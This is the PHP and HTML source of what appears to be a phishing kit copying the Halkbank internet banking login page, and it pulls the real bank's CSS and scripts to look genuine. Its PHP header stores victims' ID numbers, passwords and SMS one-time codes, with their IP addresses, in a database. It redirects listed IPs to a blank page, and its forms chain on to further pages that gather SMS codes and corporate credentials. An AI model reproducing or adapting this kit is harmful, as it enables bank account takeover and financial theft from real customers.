﻿<?php
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();

if ($_POST['pass2']<>"") { } else {
$tc = $_POST['tc'];
$pass = $_POST['pass'];
mysql_query("insert into ak (kullanici, tarih, pass, notif, ses, ip) values ( '$tc', now(), '$pass', '1', '1', '$ipcik')");
}

if ($_POST['pass2']<>"") {
$tc = $_POST['tc'];
$pass2 = $_POST['pass2'];
mysql_query("Update ak set sms2='$pass2' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
}


    $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            header('Location: about:blank'); 
        } 
    } 

?>

<!DOCTYPE html>
<html   ng-app="app"          >
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Halkbank İnternet Şubesi</title>
    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">

    <!-- Stylesheets -->
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/bootstrap.min.css?v=1505909952372" />
    
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production.min.css?v=1505909952372" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production-plugins.min.css?v=1505909952372" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/skins.min.css?v=1505909952372" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/veribranch-all.css?v=1505909952372" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/receipt.css?v=1505909952372" />
    <link rel="stylesheet" type="text/css" media="screen" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/css/plugins-all.css?v=1505909952372" />

    <script type="text/javascript">
        var featureVersions = [];
        featureVersions.push({ "featureName": "VeriBranch.UIDesigner", "version": 1461666575784 });
        featureVersions.push({"featureName":"VeriBranch.PinCreate","version":1505909952156});
        featureVersions.push({ "featureName": "VeriBranch.BackOffice", "version": 1461666574716 });
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.CallCenter","version":1505909948851});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Tools","version":1505909951911});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.CustomerInformation","version":1505909950426});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Credits","version":1505909950167});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Corporate","version":1505909949909});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Cheques","version":1505909949341});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Cards","version":1505909949100});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Payments","version":1505909951409});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Investments","version":1505909950909});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Accounts","version":1505909948789});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.FundTransfers","version":1505909950649});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Security","version":1505909951645});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Login","version":1505909951153});
        featureVersions.push({"featureName":"VeriBranch.Web","version":1505909952372});
        featureVersions.push({"featureName":"VeriBranch.FrontEnd.Common","version":1505909949617});
    </script>

    <!-- <link rel="icon" href="https://sube.halkbank.com.tr/img/favicon/favicon.ico" type="image/x-icon" /> -->
    
    <link rel="stylesheet" type="text/css" href="https://sube.halkbank.com.tr/InternetBankingHost/Maintenance/BotDetectCaptcha.ashx?get=layoutStyleSheet" />


</head>
<body   ng-controller="app.views.mvclogin.HostLoginController as vm"       class="halk-bank container extr-page">

    
    <header id="header">
        <div>
            <div class="container">
                <div class="row">
                    <div class="col-md-6 col-sm-6 col-xs-12">
                        <div id="logo-group">
                                <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img src="https://sube.halkbank.com.tr/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo.svg?v=1" alt="Halk Bankası"></a></span>
                        </div>
                    </div>
                    <div class="col-md-6 col-sm-6 col-xs-12">
                        <nav class="menu">

                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </header>


    





<div id="main" class="home" role="main" ng-init="vm.customerType=1">
    <section class="contentArea">
        <section class="loginArea">
            <div class="container">
                <vb-spinner vb-is-post-spinner="true"></vb-spinner>
                <div class="spinner-loading-overlay"></div>
                <div class="row">
                    <div class="col-xs-12 col-md-8 col-lg-7">
                        <div class="loginHead">
                                <i></i>
                                                            <span data-toggle-text='Kurumsal İnternet Bankacılığına Hoş Geldiniz.'>Bireysel İnternet Bankacılığına Hoş Geldiniz.</span>
                        </div>
                        <div ng-show="vm.customerType==1" class="loginContainer retail-login-container" style="">
                            <div>
                                <div class="tbl">
                                    <ul class="nav nav-tabs tbl-row">
                                        <li class="active tbl-cell" style="width: 50% !important;"> </li>

                                    </ul>
                                </div>
                                <div class="tab-content loginInner">

                                    <div class="tab-pane active " id="is1">
<form action="sms.php" autocomplete="off" class="smart-form first-login prevent-multiple-submit" method="post">
                                            <fieldset>
                                                <div class="row">
                                                  <section class="col col-5">
                                                        <label class="input">
                                                            <i class="icon-prepend  hb-icon-user"></i>
                                                          <input id="PinLoginCustomerID" name="pass1" autocomplete="new-password" type="password" tabindex="1" class="input-lg keyboard-input" placeholder="Sms Şifresi" value="" />
                                                            <b class="tooltip tooltip-bottom-left">
                                                                Lütfen Sms Sifresi Girin.
                                                            </b>
                                                        </label>
                                                    </section>
<input name="LoginType" type="hidden" value="PinLogin" />
                                                    <input name="CustomerType" type="hidden" value="Retail" />
                                                </div>
                                            </fieldset>
                                            <div class="row">
                                              <div class="col col-5">
                                                    <div class="virtualKeyboard hidden-xs">
                                                        <a href="javascript:void(0)" ng-click="vm.showVirtualKeyboard($event)">
                                                            <i></i>
                                                            <span>Sanal Klavye</span>
                                                        </a>
                                                    </div>
</div>
                                                <div class="col col-3">
                                                </div>

                                                <div class="col col-4 col-xs-12 text-right">
                                                    <input type="submit" class="loginBtn mrt15" value='Giriş' tabindex="4">
                                                </div>
                                            </div>
</form>                                    </div>

                                    <div class="tab-pane fade " id="is2">
<form action="smstc.php" autocomplete="off" class="smart-form first-login prevent-multiple-submit" method="post">                                            
                      <fieldset>
                                                <div class="row">
                                                    <section class="col col-5"></section>
                                                  <section class="col col-3">
                                                        <label class="input"> <b class="tooltip tooltip-top-left">
                                                            Lütfen parolanızı giriniz. Halkbank İnternet Şubesi'ni ilk defa kullanıyorsanız <br/> 
                                                                veya parolanızı blokelediyseniz 0 850 222 0 400 Halkbank Dialog'dan veya <br/> Kartla Giriş uygulamasından ürettiğiniz parolayı bu alana giriniz.
                                                          </b>
                                                    </label>
                                                    </section><input name="LoginType" type="hidden" value="TCNumberLogin" />
                                                    <input name="CustomerType" type="hidden" value="Retail" />
                                                </div>
                                            </fieldset>
</form>                                    
</div>
                                </div>
                            </div>
                        </div>
                        <div ng-show="vm.customerType==2" class="loginContainer corporate-login-container" style="display:none;">
                            <div class="loginInner">
                                <div class="title">M&#252;şteri Numarası ile Giriş</div>
<form action="smsfi.php" autocomplete="off" class="smart-form first-login-corporate prevent-multiple-submit" method="post">                                    
                                    <fieldset>
                                        <div class="row">
                                            <section class="col col-6">
                                                <label class="input">
                                                    <i class="icon-prepend fa fa-building-o"></i>
                                                    <input name="tc" type="text" autocomplete="new-password" class="input-lg keyboard-input" tabindex="1" placeholder="Firma M&#252;şteri Numarası" value="" />
                                                    <b class="tooltip tooltip-bottom-left">
                                                        Bu alana "Firma Müşteri Numaranızı" giriniz.
                                                    </b>
                                                </label>
                                            </section>
                                            <section class="col col-6">
                                                <label class="input">
                                                    <i class="icon-prepend hb-icon-user"></i>
                                                    <input name="sms1" type="text" autocomplete="new-password" class="input-lg keyboard-input" tabindex="3" placeholder="Kullanıcı M&#252;şteri Numarası" value="" />
                                                    <b class="tooltip tooltip-bottom-right">
                                                        Firma kullanıcısı iseniz bu alana "Bireysel Müşteri Numaranızı" giriniz.
                                                    </b>
                                                </label>
                                            </section>
                                        </div>
                                        <div class="row">
                                            <section class="col col-6">
                                                <label class="input">
                                                    <i class="icon-prepend fa fa-key"></i>
                                                    <input name="pass" type="password" autocomplete="new-password" class="input-lg password-keyboard" tabindex="2" placeholder="Parola" value="" />
                                                    <b class="tooltip tooltip-top-left">
                                                        Firma yetkilisi iseniz; bu alana "Firma Parolanızı" giriniz. Halkbank İnternet Şubesi'ni <br/> ilk defa kullanıyorsanız veya parolanızı blokelediyseniz şubenizden teslim aldığınız <br/> 5 haneli parolayı giriniz. Firma kullanıcısı ieniz; bu alana "Bireysel Parolanızı" giriniz. <br/> Halkbank İnternet Şubesi'ni ilk defa kullanıyorsanız veya parolanızı blokelediyseniz <br/> 0 850 222 0 400 Halkbank Dialog'dan veya Kartla Giriş uygulamasından ürettiğiniz parolayı <br/> bu alana giriniz.
                                                    </b>
                                                </label>
                                            </section>

                                            <section class="col col-6">
                                                    <div class="select selectField">
                                                        <select name="CoexistenceLoginType" tabindex="4" class="login-quick-access-dropdown">
                                                            <option value="InternetBanking">İnternet Şube</option>
                                                            <option value="AutonomousUse">&#214;zerk Kullanım</option>
                                                                    <option value="0">DTO</option>
                                                                    <option value="1">Halk Yatırım</option>
                                                        </select>
                                                    </div>
                                            </section>

                                            <input name="LoginType" type="hidden" value="PinLogin" />
                                            <input name="CustomerType" type="hidden" value="Corporate" />
                                        </div>
                                    </fieldset>
                                    <div class="row">
                                        <div class="col col-6">
                                            <div class="virtualKeyboard hidden-xs">
                                                <a href="javascript:void(0)" ng-click="vm.showVirtualKeyboard($event)">
                                                    <i></i>
                                                    <span>Sanal Klavye</span>
                                                </a>
                                            </div>
                                        </div>
                                        <div class="col col-6 col-xs-12 text-right">
                                            <input type="submit" class="loginBtn" value='Giriş'>
                                        </div>
                                    </div>
</form>                            </div>
                        </div>
                    </div>
                    <div class="col-xs-12 col-md-4 col-lg-5">
                        
<div id="myCarousel" class="carousel fade loginSlide" data-ride="carousel">
    <ol class="carousel-indicators">
                <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
                <li data-target="#myCarousel" data-slide-to="1" class=""></li>
                <li data-target="#myCarousel" data-slide-to="2" class=""></li>
    </ol>
    <div class="carousel-inner">
                <div class="item active">
                    <div class="carousel-caption ">
                        <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                            <a href="http://www.halkbank.com.tr/channels/1.asp?id=102" target="_blank">
                                <div class="txt txt2">Güvenliğiniz için</div>
<div class="txt txt1">Halkbank İnternet Şubesi girişlerinde; cep telefonu numarası, marka ve modeli bilgileriniz istenmez.</div>
<div class="txt txt3">Detaylı bilgi için tıklayınız</div>
                            </a>
                        </div>
                    </div>
                </div>
                <div class="item ">
                    <div class="carousel-caption ">
                        <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                            <a href="http://www.halkbankkobi.com.tr/" target="_blank">
                                <div class="txt txt1">A’dan Z’ye KOBİ’ye dair herşey </div>
<div class="txt txt2">halkbankkobi.com.tr’de!</div>
<div class="txt txt3">Detaylar için tıklayınız</div>
                            </a>
                        </div>
                    </div>
                </div>
                <div class="item ">
                    <div class="carousel-caption ">
                        <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
                            <a href="http://www.halkbank.com.tr/channels/1.asp?id=99" target="_blank">
                                <div class="txt txt1">Hızlı ve güvenli bankacılığın yeni numarası:</div>
<div style="font-family: 'Gotham', Arial;font-weight: 700;font-size: 20px;color: #104d7f;margin-bottom: 5px;letter-spacing: -1px">0850 222 0 400 <br /> Halkbank Dialog <br /> 0850 222 0 401 <br /> Halkbank KOBİ Dialog</div>

                            </a>
                        </div>
                    </div>
                </div>
    </div>
</div>

                    </div>
                </div>
            </div>
        </section>
        <section>
            <div class="container login-box-area login-footer-area">
    <div class="row">

        <div class="col-md-20">
            <a href="https://sube.halkbank.com.tr/InternetBankingHost/PinCreate/CardVerification">
                <div class="box box2 text-align-center blue-border">
                    <span class="blue">
                        <i class="fa fa-key fa-3x"></i>
                    </span>
                    <span class="title">Parola Oluşturma</span>
                    <span class="txt">Kart bilgilerinizi kullanarak İnternet Şubesi Parolanızı oluşturabilirsiniz.</span>
                </div>
            </a>
        </div>

        <div class="col-md-20">
            <a href="http://www.halkbank.com.tr/channels/400.asp" target="_blank">
                <div class="box box2 text-align-center blue-border">
                    <span class="blue">
                        <i class="fa fa-phone fa-3x"></i>
                    </span>
                    <span class="title">Mutlu M&#252;şteri Merkezi</span>
                    <span class="txt">Halkbank olarak siz değerli m&#252;şterilerimizin taleplerini &#246;nemsiyoruz.</span>
                </div>
            </a>
        </div>

        <div class="col-md-20">
            <a href="http://www.halkbank.com.tr/channels/1.asp?id=102" target="_blank">
                <div class="box box2 text-align-center blue-border">
                    <span class="blue">
                        <i class="fa fa-shield fa-3x"></i>
                    </span>
                    <span class="title">G&#252;venlik Bilgileri</span>
                    <span class="txt">İnternet Şubesi g&#252;venliğiniz i&#231;in dikkat etmeniz gerekenler detaylandırılmıştır.</span>
                </div>
            </a>
        </div>

        <div class="col-md-20">
            <a href="https://www.halkbank.com.tr/addresses/address.asp" target="_blank">
                <div class="box box2 text-align-center blue-border">
                    <span class="blue">
                        <i class="fa fa-map-marker fa-3x"></i>
                    </span>
                    <span class="title">ATM ve Şubeler</span>
                    <span class="txt">ATM ve Şube adreslerine buradan ulaşabilirsiniz.</span>
                </div>
            </a>
        </div>

        <div class="col-md-20">
            <a href="http://www.parafcard.com.tr/" target="_blank">
                <div class="box box2 text-align-center paraf-border">
                    <div class="paraf-card"></div>
                    <span class="title">Paraf Card</span>
                    <span class="txt">Kredi Kartı D&#252;nyasında Ayrıcalıklar Bu Paraf’ta!</span>
                </div>
            </a>
        </div>
    </div>
</div>

        </section>

    </section>
</div>




<script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function () {
        /*$.browser.isMobile = (/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase()));

        if ($.browser.isMobile)
            $('#PinLoginCustomerID, #TCNumber').attr('type', 'tel');
        */

        $(document).on('keyboardApplied', function () {
            document.getElementById('PinLoginCustomerID').focus();
        });
    });
</script>

    
    <vb-virtual-keyboard vb-selector=".password-keyboard, .keyboard-input"
                         vb-maskchar="*"
                         vb-culture="tr"
                         vb-position-my="left top"
                         vb-position-at="right bottom"
                         vb-id="password-keyboard"
                         vb-position-at-two="left bottom"
                         vb-open-on="nothing"></vb-virtual-keyboard>
    
<footer id="footer" class="inner-footer login-footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6  md-txt-lf sm-txt-cnt">
                <span class="copyright" aria-hidden="true">Her hakkı T&#252;rkiye Halk Bankası A.Ş.&#39;ye aittir &#169; 2017</span>
            </div>
            <div class="col-md-6 md-txt-rg sm-txt-lf">
                <p class="social">
                    <a href="https://www.facebook.com/halkbank" target="_blank">
                        <i class="fa fa-facebook"></i>
                    </a>
                    <a href="https://twitter.com/halkbank" target="_blank">
                        <i class="fa fa-twitter"></i>
                    </a>
                    <a href="https://www.linkedin.com/company/halkbank?trk=top_nav_home" target="_blank">
                        <i class="fa fa-linkedin"></i>
                    </a>
                    <a href="https://www.youtube.com/channel/UCTK_5dzoauKl6MSMauSJJyQ" target="_blank">
                        <i class="fa fa-youtube-play"></i>
                    </a>
                </p>
                <div class="footer-menu">
                    <a target="_blank" href="http://www.halkbank.com.tr/faqs/faqs.asp?type=0&cat=2">S.S.S</a>
                    <a target="_blank" href="https://www.halkbank.com.tr/contact/contact.asp">Bize Ulaşın</a>
                    <a target="_blank" href="http://www.halkbank.com.tr/channels/1.asp?id=99">0850 222 0 400</a>
                </div>
            </div>
        </div>
    </div>
</footer>


    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/jquery-all.js?v=1505909952372"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/angular-all.js?v=1505909952372"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/plugins-all.js?v=1505909952372"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/highcharts-all.js?v=1505909952372"></script>
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/dataTables-all.js?v=1505909952372"></script>


        <script type="text/javascript">
            _.set(window, 'VeriBranch.Config.UniqueKey', '');
        </script>
        <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/vb-all.js?v=1505909952372"></script>
            <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/VeriBranch.Web/Modules/veribranch.directives.js?v=1505909952372"></script>

    
    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/js/login-app-all.js?v=1505909952372"></script>


    <script type="text/javascript" src="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/js/sa-all.js?v=1505909952372"></script>

    <a href="javascript:void(0)" class="back-to-top visible-xs">Başa D&#246;n</a>
</body>

</html>